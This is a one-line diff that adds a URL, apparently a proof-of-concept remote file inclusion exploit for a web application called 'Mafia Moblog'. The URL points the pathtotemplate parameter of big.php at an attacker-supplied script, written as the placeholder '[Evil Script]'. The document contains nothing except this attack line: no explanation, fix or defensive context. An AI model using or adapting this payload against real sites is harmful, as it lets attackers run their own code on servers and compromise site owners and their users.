@@ -1,0 +1,1 @@
+http://www.example.com/[Mafia Moblog]/big.php?pathtotemplate=[Evil Script]
